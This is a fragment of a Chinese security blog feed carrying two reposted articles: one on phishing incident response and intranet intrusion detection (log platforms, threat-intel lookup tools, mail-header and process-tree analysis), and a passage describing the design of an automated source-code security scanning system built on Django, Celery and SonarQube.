sinkhole，防火墙IP黑名单，或者终端防安全防护软件添加行为识别特征或者文件hash黑名单等等措施；</p><p>第三步，当恶意行为被有效控制后，我们便需要实施清除活动，如：清除所有收到的恶意邮件，对访问过恶意链接并且可能潜在泄露过用户名和密码的用户进行账号重置，对于下载执行过恶意文件或者访问过后续阶段的域名或者IP的用户电脑进行重装等等；</p><p>第四步，这个阶段我们需要确保我们在第三步中的所有清除活动按照预期完成，并且所有用户和系统恢复正常使用；</p><p>第五步，当一切恢复正常，我们需要对这次的钓鱼邮件事件做复盘分析，如：为什么我们的邮件安全网关没有检测到和拦截这个钓鱼邮件？为什么我们的员工会点击这些钓鱼邮件？我们的防御和检测的漏洞在哪？下次再发生类似事件我们应该怎么办？等这些问题都找到对应的答案了我们则需要录入应急响应知识库以备后用。</p><p>综上，一个有效的应急响应是需要一个相对完整的流程来保证，如此一来便可以保证应急时不慌乱有条理且快速有效。</p><h2 id="0x04-内网入侵检测与防御"><a href="#0x04-内网入侵检测与防御" class="headerlink" title="0x04 内网入侵检测与防御"></a>0x04 内网入侵检测与防御</h2><p>本章节将依据我个人的一些工作经验和思考分别从平台搭建，工具配置，入侵调查与分析三个方面来聊聊企业的内网入侵检测和防御的建设思路。</p><h3 id="平台篇"><a href="#平台篇" class="headerlink" title="平台篇"></a>平台篇</h3><p>通常来说，一个企业要想做好内网检测和防御，首先要解决的问题就是感知能力，这就好比是人的五官要可以感知到周遭环境的变化，那么反映到安全平台上我们就需要一个统一的日志收集和分析平台。那么需要收集哪些日志呢？是所有的都收集吗？还是有选择性地收集？又如何来确定优先级呢？其实日志的收集切忌盲目全收，否则就会浪费了大量的人力物力财力到头来搜集了一堆日志却不知道如何使用。最好是结合应用场景来制定优先级，循序渐进。举个例子，比如当我们的一个应用场景是检测办公网中的入侵行为，我们需要解决的核心问题其实就是 <strong>谁在什么时间什么机器上运行了什么进程做了什么操作</strong>。分解一下这个问题，首先我们需要有日志能帮我们定位每个内网用户，如：DHCP，DNS，Kerberos Tickets（AD认证），Windows Event Logs，Antivirus等；接着我们想要知道什么时间什么机器上运行了什么，如：主机进程树和网络连接日志（即：Event Tracing for Windows）等；最后我们需要知道做了什么操作（网络行为等），如：网络设备出口流量，Web网关日志（HTTP流量），IDS日志，WiFi日志，邮件网关日志等等。这样，我们就能有针对性地收集我们当下最需要的日志并可以利用这种方法来逐步扩大日志收集的种类。</p><p>有了统一的日志收集平台，接下来我们便需要一个持续的威胁检测平台其主要作用就是编写各种检测规则和机器学习模型来对所有收集到的日志进行匹配检查以保证之前的已知威胁不会被忽略。</p><p>接着，我们需要一个IOC检测平台，其主要作用是用来对外部情报信息或者内部自产的情报信息进行实时匹配和报警以确保当前所有的已知威胁能被检测出来。</p><p>最后，我们还需要一个内部威胁追踪和记录平台，其主要作用是用于流程化和规范化地记录和总结所有以往发生的入侵事件的调查过程和分析结果以便于日后查询和关联分析。</p><p>总之，安全平台建设是企业内网入侵检测和防御的基础，只有搭建了这些基础平台，才能谈后续的工具配置和入侵分析与调查。</p><h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><p>在上一篇中我们聊到安全平台建设是企业内网入侵检测和防御的基础，在这个基础之上今天我们来聊聊工具配置。简而言之，就是有了感知能力，需要哪些工具来帮助我们分析和调查入侵，所谓工欲善其事必先利其器。</p><p>一般来说，最常见的入侵内网的手法就是钓鱼邮件和社工，而其中以钓鱼邮件最为典型，因此做好钓鱼邮件的防范是最为简单有效的防御内网入侵的方法。我之前曾提到过钓鱼邮件的常见手法，</p><ul><li><p>发送链接模拟邮箱或者内部系统登陆界面收集企业员工的账号密码；</p></li><li><p>发送链接诱导员工点击下载恶意的office文档；</p></li><li><p>直接发送恶意的office文档或者PE文件或者恶意程序的压缩包作为附件并诱导员工打开。</p></li></ul><p>针对以上几种手法，我们至少准备以下几类工具来辅助分析。</p><p><strong>第一类，域名与IP检测工具：</strong></p><p><a href="https://centralops.net/co/DomainDossier.aspx?dom_whois=1&amp;net_whois=1&amp;dom_dns=1" target="_blank" rel="noopener">https://centralops.net/co/DomainDossier.aspx?dom_whois=1&amp;net_whois=1&amp;dom_dns=1</a></p><p><a href="https://www.threatcrowd.org/" target="_blank" rel="noopener">https://www.threatcrowd.org/</a></p><p><a href="https://www.threatminer.org/" target="_blank" rel="noopener">https://www.threatminer.org/</a></p><p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p><p><a href="https://www.talosintelligence.com/" target="_blank" rel="noopener">https://www.talosintelligence.com/</a></p><p><a href="https://login.opendns.com/" target="_blank" rel="noopener">https://login.opendns.com/</a></p><p><a href="https://www.alexa.com/siteinfo" target="_blank" rel="noopener">https://www.alexa.com/siteinfo</a></p><p><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p><p><a href="https://checkphish.ai/domain/avfisher.win" target="_blank" rel="noopener">https://checkphish.ai/domain/avfisher.win</a></p><p><strong>第二类，URL检测工具：</strong></p><p><a href="https://urlscan.io/" target="_blank" rel="noopener">https://urlscan.io/</a></p><p><a href="https://sitecheck.sucuri.net/results/pool.cortins.tk" target="_blank" rel="noopener">https://sitecheck.sucuri.net/results/pool.cortins.tk</a></p><p><a href="https://quttera.com/" target="_blank" rel="noopener">https://quttera.com/</a></p><p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p><p><a href="https://checkphish.ai/" target="_blank" rel="noopener">https://checkphish.ai/</a></p><p><strong>第三类，TOR节点检测工具：</strong></p><p><a href="https://www.dan.me.uk/torcheck" target="_blank" rel="noopener">https://www.dan.me.uk/torcheck</a></p><p><a href="https://exonerator.torproject.org/" target="_blank" rel="noopener">https://exonerator.torproject.org/</a></p><p><a href="https://ipduh.com/ip/tor-exit/" target="_blank" rel="noopener">https://ipduh.com/ip/tor-exit/</a></p><p><a href="https://torstatus.blutmagie.de/" target="_blank" rel="noopener">https://torstatus.blutmagie.de/</a></p><p><strong>第四类，在线恶意程序或文档检测工具：</strong></p><p><a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">https://www.virustotal.com/en/</a></p><p><a href="https://malwr.com/" target="_blank" rel="noopener">https://malwr.com/</a></p><p><a href="http://camas.comodo.com/" target="_blank" rel="noopener">http://camas.comodo.com/</a></p><p><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p><p><a href="https://www.reverse.it/" target="_blank" rel="noopener">https://www.reverse.it/</a></p><p><a href="http://www.threatexpert.com/submit.aspx" target="_blank" rel="noopener">http://www.threatexpert.com/submit.aspx</a></p><p><a href="https://www.vicheck.ca/" target="_blank" rel="noopener">https://www.vicheck.ca/</a></p><p><a href="https://virusshare.com/" target="_blank" rel="noopener">https://virusshare.com/</a></p><p><a href="https://malshare.com/" target="_blank" rel="noopener">https://malshare.com/</a></p><p><a href="https://github.com/ytisf/theZoo" target="_blank" rel="noopener">https://github.com/ytisf/theZoo</a></p><p><strong>第五类，动态恶意程序或文档分析工具：</strong></p><p>Cuckoo: <a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p><p>Regshot: <a href="https://sourceforge.net/projects/regshot/" target="_blank" rel="noopener">https://sourceforge.net/projects/regshot/</a></p><p>Process Hacker: <a href="http://processhacker.sourceforge.net/" target="_blank" rel="noopener">http://processhacker.sourceforge.net/</a></p><p>Process Monitor: <a href="https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx</a></p><p>ProcDOT: <a href="https://www.cert.at/downloads/software/procdot_en.html" target="_blank" rel="noopener">https://www.cert.at/downloads/software/procdot_en.html</a></p><p>WinDump: <a href="https://www.winpcap.org/windump/" target="_blank" rel="noopener">https://www.winpcap.org/windump/</a></p><p>Graphviz: <a href="http://www.graphviz.org/Download..php" target="_blank" rel="noopener">http://www.graphviz.org/Download..php</a></p><p>Capture-BAT: <a href="https://www.honeynet.org/node/315" target="_blank" rel="noopener">https://www.honeynet.org/node/315</a> (x86 environment only)</p><p>Fakenet: <a href="https://sourceforge.net/projects/fakenet/" target="_blank" rel="noopener">https://sourceforge.net/projects/fakenet/</a></p><p>Wireshark: <a href="https://www.wireshark.org/#download" target="_blank" rel="noopener">https://www.wireshark.org/#download</a></p><p><strong>第六类，邮件检测工具：</strong></p><p><a href="http://spf.myisp.ch/" target="_blank" rel="noopener">http://spf.myisp.ch/</a></p><p><strong>第七类，Google搜索</strong>，这也是最简单暴力但却十分有效的工具之一。</p><p>在分析内网入侵时合理地使用以上这些工具往往会有事半功倍的效果。另外，作为一个入侵分析和响应工程师切忌在没有网络隔离的情况下在办公电脑上直接访问可疑链接或者分析恶意样本文件。</p><h3 id="分析篇"><a href="#分析篇" class="headerlink" title="分析篇"></a>分析篇</h3><p>在前两篇中，我们分别谈到了企业内网入侵检测和防御所需要的安全平台建设和工具配置，有了这些基础我们便来聊聊如何运用这些已有的平台和工具来分析真实的内网入侵事件。</p><p>为了更好的说明这个问题，我将仍以最常见的利用钓鱼邮件入侵企业员工电脑并进而入侵内网为例来说明如何分析这类的入侵事件。为了能够检测和分析这类入侵事件，我们需要有能力获得最原始的钓鱼邮件，这就需要我们从至少以下几个途径来获取：</p><ul><li><p>企业员工主动提交可疑的钓鱼邮件，这就需要员工具备一定的安全意识（安全意识培训的重要性），以及统一的可疑邮件提交平台（需要开发成本）</p></li><li><p>邮件安全网关，如：Ironport，FireEye Email Security等</p></li><li><p>IOC检测平台，及时检测已知的恶意域名或者IP，可疑的发件人，恶意附件等</p></li></ul><p>当我们拿到了原始的钓鱼邮件，首先需要确保将其转化成EML文本格式（可用工具<a href="https://github.com/mvz/msgconvert），接着，我们至少需要从以下几个方面来分析：" target="_blank" rel="noopener">https://github.com/mvz/msgconvert），接着，我们至少需要从以下几个方面来分析：</a></p><ol><li><p>原始邮件头，包括：From, envelope-from, SPF, client-ip等</p><p> 1.1 可以通过dig命令，如：dig -t txt baidu.com，或使用工具<a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">spoofcheck</a>来检查邮件域名是否可以被spoof了</p><p> 1.2 对比From和envelope-from是否一致，也是应该判断是否为恶意邮件的有效方法</p></li><li><p>原始邮件正文，包括：域名／IP，URL，附件等</p><p> 2.1 域名/IP和URL的分析可以使用工具篇里提到的相应工具来分析，判断是否存在multi-stage C&amp;C</p><p> 2.2 附件的分析也可以使用工具篇里提到的在线／本地恶意程序分析沙箱或者自行逆向分析，进而了解恶意程序的执行逻辑以及对应的IOC(域名，URL，文件，注册表键值，执行的系统命令等)</p><p> 2.3 利用日志分析平台，查询恶意域名的DNS或者HTTP(S)流量日志，结合主机EDR（Endpoint Detection and Response）终端日志将DNS请求关联到相应的主机进程，如：ETW for Windows，BCC/eBPF for Linux等</p><p> 2.4 查询触发恶意域名的DNS请求的主机进程的整个进程树，分析malware完整的执行链，例如：outlook.exe -&gt; winword.exe -&gt; cmd.exe -&gt; powershell.exe</p><p> 2.5 查询所有触发了上述执行链的受感染主机，并重复2.4 的步骤直到没有新的执行链被发现为止</p></li></ol><p>在分析完了以上这些，我们就可以添加对应的防御和检测措施了，例如：</p><ol><li><p>通过应急响应章节中提到的DNS Sinkhole来阻断所有恶意域名的DNS请求</p></li><li><p>确保终端反病毒程序可以检测并清理每个阶段的恶意文件</p></li><li><p>添加防火墙规则来阻止内网主机对恶意IP地址的访问</p></li><li><p>隔离重装已经感染的主机进行</p></li><li><p>重置受感染内网用户的登录凭证</p></li><li><p>删除所有企业用户收到的来自同一恶意发送者的邮件</p></li><li><p>将分析得出的IOC添加到IOC检测平台</p></li><li><p>依据已发现的Malware执行链添加新的入侵检测规则</p></li></ol><p>至此，我已简单地介绍了一个相对完整的针对利用钓鱼邮件入侵企业员工电脑并进而入侵内网的入侵事件的分析和防御的方法与流程。 </p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自  &lt;a href=&quot;https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全小飞侠 https://mp.weixin.qq.com/s/quwaJMVHYpBAXpkgtR12Kw&lt;/a&gt; &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文主要是介绍一下笔者对于甲方安全能力建设的一些经验，心得和零散的思考。需要特别强调的是不同企业的实际情况不尽相同，本文仅供参考，不具普遍意义。&lt;/p&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="红蓝对抗" scheme="http://pa55w0rd.github.io/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="应急响应" scheme="http://pa55w0rd.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>代码自动化扫描系统的建设（转发）</title>
    <link href="http://pa55w0rd.github.io/%E4%BB%A3%E7%A0%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F%E5%BB%BA%E8%AE%BE/"/>
    <id>http://pa55w0rd.github.io/代码自动化扫描系统建设/</id>
    <published>2018-10-22T06:58:04.000Z</published>
    <updated>2018-11-21T08:55:15.140Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自 <a href="https://mp.weixin.qq.com/s/tSbWhBh9RQQ5Wduoo18MEg" target="_blank" rel="noopener">代码自动化扫描系统的建设- 唯品会安全应急响应中心</a></p></blockquote><h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><h3 id="为什么需要自动化扫描？"><a href="#为什么需要自动化扫描？" class="headerlink" title="为什么需要自动化扫描？"></a>为什么需要自动化扫描？</h3><p>互联网的快速发展，程序员是功不可没的。从软件开发的瀑布模型到现在的敏捷开发, 软件的开发周期从数年到数月、从数月到数天，时间不断变换缩减。传统的代码扫描方式已经不能跟进新时代的软件开发流程中，这就需要改变我们的代码扫描方式，它应该在有限的时间内尽量发现足够多的安全问题，并能够结合 [<code>CI (持续集成)</code>]来触发代码扫描。</p><h3 id="自动化扫描时扫描引擎用什么？"><a href="#自动化扫描时扫描引擎用什么？" class="headerlink" title="自动化扫描时扫描引擎用什么？"></a>自动化扫描时扫描引擎用什么？</h3><a id="more"></a><p>你可以使用任何提供 API 接口的开源或商业的扫描引擎。这里我们把“扫描引擎”(指第三方的审计工具)与“自动化系统”剥离(解耦)开来，“扫描引擎”只负责安全漏洞扫描；“自动化系统”负责漏洞收集、分析、处理等动作。同时你也可以通过“自动化系统”的后台来添加一些安全规则。</p><h3 id="怎么触发自动化扫描？"><a href="#怎么触发自动化扫描？" class="headerlink" title="怎么触发自动化扫描？"></a>怎么触发自动化扫描？</h3><p>两种方式：</p><ul><li>管理后台手动触发</li><li>CI(持续集成)/[CD(持续交付)]系统中触发</li></ul><h3 id="如何解决漏报和误报？"><a href="#如何解决漏报和误报？" class="headerlink" title="如何解决漏报和误报？"></a>如何解决漏报和误报？</h3><p>两种方式：</p><p>“<code>基于规则</code>”和“<code>基于插件</code>”，这里使用白名单表示误报、使用黑名单表示漏报。</p><p><strong>基于规则</strong></p><p>这里的规则是指基于文本的处理方式，如：使用正则表达式来匹配文件中的某些特征，使用字符串来判断是否存在敏感信息等。</p><p><em>PS: 这里有一些细节需要注意。</em></p><ul><li><p>正则表达式：</p><ul><li>是否区分大小写</li><li>是否支持多行匹配</li></ul></li><li><p>字符串：</p><ul><li>是否首部包含</li><li>是否尾部包含</li><li>是否在当前字符串中</li></ul></li></ul><p><strong>基于插件</strong></p><p>插件的自由度较大，其本质是把要扫描的文件信息作为插件执行入口的上下文，文件信息包括：路径、名称、内容等。你也可以在插件中写一些判断逻辑或调用第三方工具。</p><h3 id="漏报率和误报率怎么样？"><a href="#漏报率和误报率怎么样？" class="headerlink" title="漏报率和误报率怎么样？"></a>漏报率和误报率怎么样？</h3><p>漏报率暂时无法很好的测量， <code>漏报率 = 漏报数/(漏洞数+漏报数) × 100%</code> 而实际中很少有人(这里指非安全审计人员)会发现漏报，理论上你写的规则或插件越多越会减少漏报。</p><p>误报是可以通过白名单规则或插件处理的，理论上可以百分百消除误报，但是需要手动进行设置。</p><h3 id="Web-通用型漏洞可以都覆盖么？"><a href="#Web-通用型漏洞可以都覆盖么？" class="headerlink" title="Web 通用型漏洞可以都覆盖么？"></a>Web 通用型漏洞可以都覆盖么？</h3><p>Web 通用型漏洞以 <code>OWASP 2017 TOP 10</code> 为例，其大多数都在黑盒测试的范围内。适用白盒测试仅限于：“<code>A3:2017-Sensitive Data Exposure</code>”、“<code>A9:2017-Using Components with Known Vulnerabilities</code>”，而这两项也是我们自动化扫描系统的基本要求。</p><h3 id="扫描出来的漏洞如何形成闭合？"><a href="#扫描出来的漏洞如何形成闭合？" class="headerlink" title="扫描出来的漏洞如何形成闭合？"></a>扫描出来的漏洞如何形成闭合？</h3><p>这需要结合公司自身的软件开发方式而定，大多数公司采用“<code>Gitlab</code>” + “<code>Confluence</code>” + “<code>Jira</code>” + “<code>Jenkins</code>”的工作方式，那么我们可以通过 <code>Jira</code> 或 <code>Gitlab</code>的 API 接口来创建问题工单。</p><h2 id="0x01-设计要求"><a href="#0x01-设计要求" class="headerlink" title="0x01 设计要求"></a>0x01 设计要求</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p><strong>系统功能：</strong></p><ul><li>尽量发现足够多的安全问题<ul><li>硬编码问题</li><li>敏感信息泄露</li><li>使用存在已知漏洞的组件</li><li>危险函数识别</li></ul></li><li>可集成第三方扫描引擎</li><li>可自动化处理误报</li><li>可通过 CI 方式触发扫描</li><li>可根据条件自动创建 Issue</li></ul><p><strong>扫描目标主要分为两种：</strong></p><p>一种为线上 Git 扫描；一种为离线扫描。</p><p>“<code>线上 Git 扫描</code>” 其主要应用场景为企业内部使用如 Gitlab 这种代码托管系统，我们定时同步 Gitlab 上的项目信息，通过 CI 来调用 API 接口进行扫描，自动化扫描就是这种模式，其执行流程为：<code>“后台服务定时同步项目” -&gt; &quot;API接口下发扫描任务&quot; -&gt; “后台调度执行扫描”</code>。</p><p>“<code>离线扫描</code>”其形式为审计人员手动上传一个 zip 或 rar 的源码包，扫描系统自动解压后进行代码扫描。</p><p>这两种模式的执行流程略有不同，所以后端实现也略有不同，第一种的执行流程要比第二种较为复杂，我们这里会以第一种方式来实现自动化扫描。</p><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p><strong>系统要求：</strong></p><ul><li>单个项目扫描控制在 20 分钟以内</li><li>支持调度节点监控</li><li>支持漏洞知识库管理</li><li>支持 API 接口</li><li>支持分布式部署, 方便扩展来提升扫描能力</li></ul><p>时间控制是为了保证 CI/CD 过程不会太长，避免影响项目发布。调度节点监控，这里存在两种情况：一种是调度进程的心跳监控；一种为扫描任务的超时监控。漏洞知识库主要为了与组件分析模块分析出的依赖组件进行漏洞匹配。API 接口是为了方便第三方(代指CI/CD)调用来下发扫描任务或查询结果。分布式部署方式，可以水平扩展来提高调度节点和API节点的处理速度与能力。</p><h3 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h3><p><strong>主要系统：</strong></p><ul><li>代码托管子系统</li><li>自动化扫描子系统</li><li>第三方扫描子引擎</li></ul><p>这里从整体角度来观察，大致分为三个子系统，<code>自动化扫描子系统</code>依赖<code>代码托管子系统</code>，但不依赖<code>扫描引擎(泛指第三方商业或开源审计产品)子系统</code>，这是由于<code>自动化扫描子系统</code>内部集成了组件漏洞识别、黑白名单规则、黑白名单插件等功能，最后我们用一张图来说明。</p><p><img src="\assets\img\auto_scan\1.png" alt=""></p><p>这里主要介绍了自动扫描系统的背景和要实现的目标，下面我们将会详细介绍各个层与模块的设计。</p><h2 id="0x02-系统设计"><a href="#0x02-系统设计" class="headerlink" title="0x02 系统设计"></a>0x02 系统设计</h2><h3 id="1-基础准备"><a href="#1-基础准备" class="headerlink" title="1 基础准备"></a>1 基础准备</h3><p>这里我们主要使用 Linux 来搭建我们的自动化扫描系统，按照设计的角色划分，我们这里需要三台 CentOS 7 的服务器，当然服务器可以是物理设备也可以是虚拟机，如果公司内部的扫描项目较多或为以后扩展考虑意见使用物理机。<br>服务器数量|操作系统|扫描引擎|数据库|开发语言|角色<br>–|–|–|–|–|–|<br>3台|CentOS 7| SonarQube | MySQL| Python| - UI+MySQL+MQ<br>- 扫描节点<br>- 第三方引擎（SonarQube）</p><p><strong>服务器划分:</strong></p><p>这里我们假定一个 codeaudit 域, 三台服务器的主机名称分别为：</p><ul><li>ui.codeaudit: 负责后台管理系统的部署，包括数据库、MQ。</li><li>task.codeaudit: 负责调度扫描引擎。</li><li>sonarqube.codeauit: SonarQube的后台服务端。</li></ul><h3 id="2-技术说明"><a href="#2-技术说明" class="headerlink" title="2 技术说明"></a>2 技术说明</h3><p>这里会讨论到所需的具体技术点，有些技术或方法可能不是最佳的方案，但是已经过我们测试检验是可行的。</p><p>以下为实际开发中用到的一些技能：</p><ul><li>Python/Django/Jquery/Celery</li><li>Gitlab API/Sonar API</li><li>Git/Gitlab CI/Jenkins</li><li>Centos 7/Shell</li><li>NFS/Nginx/uWSGI</li><li>MySQL/RabbitMQ/Redis</li><li>安全漏洞知识</li></ul><p><strong>CentOS 7</strong></p><p>CentOS 7 与 6 的版本会有一些区别，我们需要具有 Linux 的基本操作基础，了解 systemctl、firewall-cmd、crontab等命令；了解SELinux，修改SELinux状态；并能编写systemd的自启动脚本。</p><p><strong>Git</strong></p><p>了解 Git 的基本操作命令，使用 SSH 密钥的方式提交或拉取代码; 熟悉git clone、git log、git pull、git branch、git remote、git fetch、git for-each-ref、git ls-files等基本命令的操作。</p><p>例如：</p><ul><li>使用git for-each-ref来得到当前分支的最后一次 commit id；</li><li>使用git ls-files来判断项目中是否存在sonar-project.properties配置文件；</li><li>使用git log -n1 /path/file来获取文件最后一次 commit 的作者。</li></ul><p><strong>CI/CD</strong></p><p>不论是集成到 Gitlab CI 或是Jenkins, 我们都需要先了解项目上线的基本流程，如：开发的代码规范、测试环节（单元测试/功能测试）、发布部署环节等。一般我们会将代码扫描环节放在在测试环节后，发布部署前。</p><p><strong>Python</strong></p><p>这里我们使用Python进行后台的服务端开发，使用Django进行前台 UI 的开发，使用django-rest-swagger来开发 API 接口，使用Celery作为扫描任务的调度框架。</p><p><strong>数据库与中间件</strong></p><p>数据库我们选择使用 MySQL 5.7(或MariaDB, 他们在使用上没有太大的区别); Celery 的消息中间件可以使用 Redis 或是 RabbitMQ，这里你可以在开发的时候使用 Redis，正式部署时使用 RabbitMQ。</p><p><strong>安全漏洞知识</strong></p><ul><li>了解 OWASP TOP 10 的漏洞类型原理与解决方案；</li><li>了解 CWE 的漏洞信息；</li><li>了解公司主流的开发语言。</li></ul><h3 id="3-模块设计"><a href="#3-模块设计" class="headerlink" title="3 模块设计"></a>3 模块设计</h3><p>下图中我们自上而下按照逻辑大致划分了”四”层：UI层、存储层、服务层、任务调度扫描引擎层（由于任务调度与服务同在后台运行，所以又统称为服务层）。</p><p><img src="\assets\img\auto_scan\2.png" alt=""></p><ul><li><p>UI 层</p><p>  提供扫描系统的后台管理、API接口、漏洞知识库等一系列的交互功能入口，不同的人员或系统可以根据各自的需求通过不同的交互接口来满足自己需求。如：CI/CD系统可通过 API 接口创建扫描任务并获取扫描结果；安全审计人员可通过后台进行规则或插件的添加；开发人员可通过漏洞知识库来获取相关语言或技术的漏洞信息。</p></li><li><p>存储层</p><p>  主要包括关系型数据库、消息中间件(指MQ)、NFS(网络文件系统)，这里我们使用了 MySQL 5.7 的数据库； RabbitMQ 是作为 Celery 调度框架的消息中间件；NFS担当网络共享存储，用于存储代码与扫描日志。</p></li><li><p>调度层</p><p>  扫描任务的执行流程，主要可分为：</p><ul><li>初始化：扫描任务的环境初始化，如：日志目录、日志文件、加载插件、加载漏洞规则等；</li><li>分析项目：项目代码统计、依赖组件统计、漏洞知识库关联等；</li><li>扫描漏洞：调用第三方扫描引擎、统计扫描结果；</li><li>漏报处理：使用黑名单规则和插件进行扫描；</li><li>误报处理：使用白名单规则和插件进行误报处理；</li><li>闭环漏洞：针对高危漏洞在 GitLab 或 Jira 系统中创建一个 Issue。</li></ul></li><li><p>服务层</p><p>  后台的服务，其主要包括：GitLab 系统中的项目同步、报表生成、调度进程监控。</p></li></ul><h2 id="0x03-系统功能"><a href="#0x03-系统功能" class="headerlink" title="0x03 系统功能"></a>0x03 系统功能</h2><h3 id="1-数据库设计"><a href="#1-数据库设计" class="headerlink" title="1 数据库设计"></a>1 数据库设计</h3><p><strong>权限相关</strong></p><p>权限控制，这里使用 django 自带的权限表来进行权限控制，我们可以通过auth_group表来创建用户组，为不同的用户组赋予不同的角色权限auth_group_permissions，你可以访问<a href="https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization" target="_blank" rel="noopener">官方地址</a> 来获得更多关于权限的信息。</p><p>django 权限表如下：</p><ul><li>auth_group</li><li>auth_group_permissions</li><li>auth_permission</li><li>auth_user</li><li>auth_user_groups</li><li>auth_user_user_permissions</li></ul><p><img src="\assets\img\auto_scan\3.png" alt=""></p><p><strong>项目相关</strong></p><p>项目表主要包括：项目组、项目、分支与TAG、统计信息、依赖组件、插件规则、扫描任务等相关表。</p><p><img src="\assets\img\auto_scan\4.png" alt=""></p><p><strong>漏洞知识库</strong></p><p>漏洞知识库，这里主要存储漏洞类型、漏洞知识等内容。</p><p><img src="\assets\img\auto_scan\5.png" alt=""></p><p><strong>系统相关</strong></p><p>系统表主要包括系统的安全周报、节点监控、系统日志等信息。</p><p><img src="\assets\img\auto_scan\6.png" alt=""></p><h3 id="2-UI系统"><a href="#2-UI系统" class="headerlink" title="2 UI系统"></a>2 UI系统</h3><p>扫描系统的后台，方便安全审计人员管理项目和系统。</p><h4 id="2-1-项目管理"><a href="#2-1-项目管理" class="headerlink" title="2.1 项目管理"></a>2.1 项目管理</h4><p><strong>2.1.1 项目组</strong></p><p>项目组我们通过 GitLab 的 API 同步所有项目组信息到我们的扫描系统，项目组的信息包括：<code>项目组名称、项目组描述、创建时间、URL地址、项目成员</code>等。</p><p><strong>2.1.2 项目</strong></p><p>项目是从分组中获取得到，需要注意的是可能会存在项目名相同但分组不同的情况。项目基本信息应包括：项目名称、项目描述、所属分组、默认分支、Git地址、项目成员、代码统计、依赖组件、分支管理、TAG管理等。</p><p><img src="\assets\img\auto_scan\7.png" alt=""></p><p><strong>2.1.3 扫描任务</strong></p><p>扫描任务会有四种状态：等待调度、正在扫描、扫描完成、扫描失败。每一次创建扫描任务时，都会查询是否存在等待调度或正在扫描的任务，如果存在则提示创建失败。</p><p><img src="\assets\img\auto_scan\8.png" alt=""></p><h4 id="2-2-规则插件"><a href="#2-2-规则插件" class="headerlink" title="2.2 规则插件"></a>2.2 规则插件</h4><p><strong>2.2.1 规则</strong></p><p>这里使用正则表达式来做特征匹配，并可通过限定文件的后缀来提高精准度。</p><p>正则表达式标志位：</p><ul><li>忽略大小写</li><li>支持多行匹配</li></ul><p><img src="\assets\img\auto_scan\9.png" alt=""></p><p><strong>2.2.2 插件</strong></p><p>这里使用了 Python 的反射机制，任务初始化时会优先初始化插件，当扫描完成时，扫描引擎会使用插件批量进行检测。插件入口函数为run()，漏洞详情对象会作为**kwargs参数的上下文传到该函数中。</p><p><img src="\assets\img\auto_scan\10.png" alt=""></p><p><strong>2.2.3 规则知识库</strong></p><p>规则知识库是区别与漏洞知识库的，往往规则知识库的内容要比漏洞知识库的内容简单，但是结构清晰。如：漏洞示例代码、漏洞说明、解决办法、参考链接等信息。</p><p><img src="\assets\img\auto_scan\11.png" alt=""></p><h4 id="2-3-漏洞知识库"><a href="#2-3-漏洞知识库" class="headerlink" title="2.3 漏洞知识库"></a>2.3 漏洞知识库</h4><p><strong>2.3.1 漏洞类型</strong></p><p>这里建议使用 CWE 的漏洞标准，可参考这个文档：<a href="https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf" target="_blank" rel="noopener">文档1</a></p><p><img src="\assets\img\auto_scan\12.png" alt=""></p><p><strong>2.3.2 漏洞管理</strong></p><p>主要包括添加漏洞和管理漏洞，漏洞的信息应该包括：CVE/CNVD/CNNVD编号、漏洞标题、风险等级、漏洞来源、发现时间、受影响范围、漏洞详情、漏洞类型、解决版本等基本信息。</p><p><img src="\assets\img\auto_scan\13.png" alt=""></p><p>这里我们要实现漏洞知识库与识别出的组件联动功能，主要通过两个属性：</p><ul><li><p>组件标签</p><p>  这里需要为每个漏洞添加一个 Tag 属性，其属性值如：org.springframework、com.alibaba.fastjson，建议标签一律使用小写字母。</p></li><li><p>版本规则</p><p>  使用正则表达式来进行匹配，如：CVE-2018-1270 中受影响的 Spring Framework 版本为：5.0.x-5.0.5 和 4.3.x-4.3.16，那么我们的规则可以写成如下：</p><p>  <img src="\assets\img\auto_scan\14.png" alt=""></p></li></ul><h4 id="2-4-报表管理"><a href="#2-4-报表管理" class="headerlink" title="2.4 报表管理"></a>2.4 报表管理</h4><p><strong>2.4.1 